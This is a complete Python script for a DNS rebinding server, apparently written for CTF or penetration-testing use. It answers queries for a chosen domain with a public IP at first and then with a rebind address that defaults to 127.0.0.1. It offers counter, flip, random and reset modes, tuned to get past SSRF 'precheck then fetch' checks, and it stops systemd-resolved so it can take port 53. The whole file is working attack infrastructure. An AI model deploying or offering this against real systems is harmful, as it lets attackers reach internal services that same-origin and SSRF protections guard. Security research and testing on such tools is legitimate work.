#!/usr/bin/env python
# coding=utf-8

import argparse
import random
import atexit
import datetime
import signal
import subprocess
import sys
import time
import threading
import traceback
import socketserver
import struct
try:
    from dnslib import *
except ImportError:
    print("Missing dependency dnslib: <https://pypi.python.org/pypi/dnslib>. Please install it with `pip`.")
    sys.exit(2)


class DomainName(str):
    def __getattr__(self, item):
        return DomainName(item + '.' + self)


# D = DomainName('ox-rebind.pwnhub.eu.')
# IP = '138.201.152.197'
# TTL = 0 

# soa_record = SOA(
#     mname=D.ns1,  # primary name server
#     rname=D.andrei,  # email of the domain administrator
#     times=(
#         201307231,  # serial number
#         60 * 60 * 1,  # refresh
#         60 * 60 * 3,  # retry
#         60 * 60 * 24,  # expire
#         60 * 60 * 1,  # minimum
#     )
# )
# ns_records = [NS(D.ns1), NS(D.ns2)]
# records = {
#     D: [A(IP), AAAA((0,) * 16), MX(D.mail), soa_record] + ns_records,
#     D.ns1: [A(IP)],  # MX and NS records must never point to a CNAME alias (RFC 2181 section 10.3)
#     D.ns2: [A(IP)],
#     D.mail: [A(IP)],
#     D.andrei: [CNAME(D)],
# }


RESOLVED_SERVICE = "systemd-resolved"

# Tracks whether *we* stopped systemd-resolved, so we only restart it on exit
# if we were the ones who stopped it.
_resolved_stopped = {"value": False}


def _systemctl(action):
    """Run `systemctl <action> systemd-resolved`, returning the CompletedProcess
    or None if systemctl is not available."""
    try:
        return subprocess.run(
            ["systemctl", action, RESOLVED_SERVICE],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    except FileNotFoundError:
        return None


def resolved_is_active():
    r = _systemctl("is-active")
    return r is not None and r.stdout.strip() == "active"


def stop_resolved():
    """Stop systemd-resolved so we can bind port 53. Only acts if it is running."""
    if not resolved_is_active():
        return
    print("Stopping %s so we can use port 53..." % RESOLVED_SERVICE)
    r = _systemctl("stop")
    if r is not None and r.returncode == 0:
        _resolved_stopped["value"] = True
    else:
        err = (r.stderr.strip() if r is not None else "systemctl not found")
        print("Warning: could not stop %s: %s" % (RESOLVED_SERVICE, err))
        print("You probably need to run this as root (sudo).")


def start_resolved():
    """Restart systemd-resolved, but only if we were the ones who stopped it.
    Safe to call more than once (finally block + atexit + signal handler)."""
    if not _resolved_stopped["value"]:
        return
    _resolved_stopped["value"] = False
    print("Restarting %s..." % RESOLVED_SERVICE)
    r = _systemctl("restart")
    if r is None or r.returncode != 0:
        err = (r.stderr.strip() if r is not None else "systemctl not found")
        print("Warning: could not restart %s: %s" % (RESOLVED_SERVICE, err))


def dns_response(data, domain, ip, rebind, ttl, counterMax, hostCounter, flip, sleep, lock, resetAfter, lastSeen, randomMode):
    request = DNSRecord.parse(data)

    # print(request)

    reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)

    qname = request.q.qname
    qn = str(qname)
    qtype = request.q.qtype
    qt = QTYPE[qtype]

    if qn == domain or qn.endswith('.' + domain):


        #print(request)
        rqt = "A"
        if qt in ['*', rqt]:
            print("Got a request for " + str(qname) + " Type: " + str(qt))

            # Optional delay before answering each query.
            if sleep > 0:
                time.sleep(sleep)

            # Pick the address to answer with. Guard shared state with a lock
            # because the threading servers handle each query in its own thread.
            with lock:
                # Auto-reset a host's state after a period of inactivity, so each
                # fresh burst of queries (e.g. a new precheck+fetch attempt)
                # starts over from the first answer (--ip) again.
                if resetAfter > 0 and qn in lastSeen and (time.time() - lastSeen[qn]) > resetAfter:
                    hostCounter[qn] = 0
                lastSeen[qn] = time.time()

                count = hostCounter.get(qn, 0)
                if randomMode:
                    answer_ip = random.choice([ip, rebind])
                elif flip:
                    # Alternate between the two IPs on every single query.
                    answer_ip = ip if count % 2 == 0 else rebind
                else:
                    # Original behaviour: first counterMax queries get ip,
                    # everything afterwards gets rebind (one-way flip).
                    answer_ip = ip if count < counterMax else rebind
                hostCounter[qn] = count + 1

            reply.add_answer(RR(rname=qname, rtype=getattr(QTYPE, rqt), rclass=1, ttl=ttl, rdata=A(answer_ip)))
            print("------------------------ Host ", qn, " query #", hostCounter[qn], " -> ", answer_ip)

#        for name, rrs in records.items():
#            if name == qn:
#                for rdata in rrs:
#                    rqt = rdata.__class__.__name__
#                    if qt in ['*', rqt]:
#                        reply.add_answer(RR(rname=qname, rtype=getattr(QTYPE, rqt), rclass=1, ttl=TTL, rdata=rdata))
      



        #for rdata in ns_records:
        #    reply.add_ar(RR(rname=D, rtype=QTYPE.NS, rclass=1, ttl=TTL, rdata=rdata))

        #reply.add_auth(RR(rname=D, rtype=QTYPE.SOA, rclass=1, ttl=TTL, rdata=soa_record))

        print("---- Reply:\n", reply)

    return reply.pack()


class BaseRequestHandler(socketserver.BaseRequestHandler):

    def get_data(self):
        raise NotImplementedError

    def send_data(self, data):
        raise NotImplementedError

    def handle(self):
        now = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S.%f')
        #print("\n\n%s request %s (%s %s):" % (self.__class__.__name__[:3], now, self.client_address[0],
        #                                       self.client_address[1]))
        try:
            data = self.get_data()
        #   print(len(data), data)  # repr(data).replace('\\x', '')[1:-1]
            self.send_data(dns_response(data, self.server.domain, self.server.ip, self.server.rebind, self.server.ttl, self.server.counterMax, self.server.hostCounter, self.server.flip, self.server.sleep, self.server.lock, self.server.resetAfter, self.server.lastSeen, self.server.randomMode))
        except Exception:
            traceback.print_exc(file=sys.stderr)


class TCPRequestHandler(BaseRequestHandler):

    def get_data(self):
        data = self.request.recv(8192)
        sz = struct.unpack('>H', data[:2])[0]
        if sz < len(data) - 2:
            raise Exception("Wrong size of TCP packet")
        elif sz > len(data) - 2:
            raise Exception("Too big TCP packet")
        return data[2:]

    def send_data(self, data):
        sz = struct.pack('>H', len(data))
        return self.request.sendall(sz + data)


class UDPRequestHandler(BaseRequestHandler):

    def get_data(self):
        return self.request[0]

    def send_data(self, data):
        return self.request[1].sendto(data, self.client_address)


def main():
    parser = argparse.ArgumentParser(description='Start a DNS implemented in Python.')
    parser = argparse.ArgumentParser(description='Start a DNS implemented in Python. Usually DNSs use UDP on port 53.')
    parser.add_argument('--port', default=53, type=int, help='The port to listen on.')
    parser.add_argument('--tcp', action='store_true', help='Listen to TCP connections.')
    parser.add_argument('--udp', action='store_true', help='Listen to UDP datagrams.')
    parser.add_argument('--domain', default=None, type=str, help='The domain to listen for', required=True)
    parser.add_argument('--ttl', default=0, type=int, help='TTL value of DNS responses')
    parser.add_argument('--bind', default='', type=str, help='IP Adress for server to listen on')
    parser.add_argument('--ip', default='8.8.8.8', help='IP Adress used to respond')
    parser.add_argument('--rebind', default='127.0.0.1', help='IP address for rebind')
    parser.add_argument('--counter', default=2, type=int, help='Number of requests before rebinding (ignored when --flip is set)')
    parser.add_argument('--flip', action='store_true', help='Constantly alternate between --ip and --rebind on every query')
    parser.add_argument('--random', dest='randomMode', action='store_true', help='Answer each query independently 50/50 between --ip and --rebind (robust to query storms)')
    parser.add_argument('--sleep', default=0, type=float, help='Seconds to wait before answering each query (e.g. 1 or 2)')
    parser.add_argument('--reset-after', default=0, type=float, help='Reset a host back to the first answer (--ip) after this many seconds of inactivity, so repeated attempts work without a restart')
    parser.add_argument('--no-resolved', action='store_true', help="Don't automatically stop/start systemd-resolved (port 53 only)")

    args = parser.parse_args()
    if not (args.udp or args.tcp): parser.error("Please select at least one of --udp or --tcp.")

    # Only systemd-resolved on port 53 conflicts with us; manage it automatically
    # unless the user opted out. Restart it again on exit / interrupt / SIGTERM.
    manage_resolved = (not args.no_resolved) and sys.platform.startswith("linux") and args.port == 53
    if manage_resolved:
        atexit.register(start_resolved)
        signal.signal(signal.SIGTERM, lambda *a: sys.exit(0))
        stop_resolved()

    print("Starting nameserver...")

    servers = []
    if args.udp: servers.append(socketserver.ThreadingUDPServer((args.bind, args.port), UDPRequestHandler))
    if args.tcp: servers.append(socketserver.ThreadingTCPServer((args.bind, args.port), TCPRequestHandler))

    for s in servers:
        domain = args.domain if args.domain.endswith(".") else args.domain + "."
        s.domain = DomainName(domain) # ox-rebind.pwnhub.eu.
        s.ip = args.ip
        s.rebind = args.rebind
        s.ttl = args.ttl
        s.counterMax = args.counter
        s.flip = args.flip
        s.sleep = args.sleep
        s.resetAfter = args.reset_after
        s.randomMode = args.randomMode
        s.hostCounter = {}
        s.lastSeen = {}
        s.lock = threading.Lock()
        thread = threading.Thread(target=s.serve_forever)  # that thread will start one more thread for each request
        thread.daemon = True  # exit the server thread when the main thread terminates
        thread.start()
        print("%s server loop running in thread: %s" % (s.RequestHandlerClass.__name__[:3], thread.name))

    try:
        while 1:
            time.sleep(1)
            sys.stderr.flush()
            sys.stdout.flush()

    except KeyboardInterrupt:
        pass
    finally:
        for s in servers:
            s.shutdown()
        start_resolved()

if __name__ == '__main__':
    main()

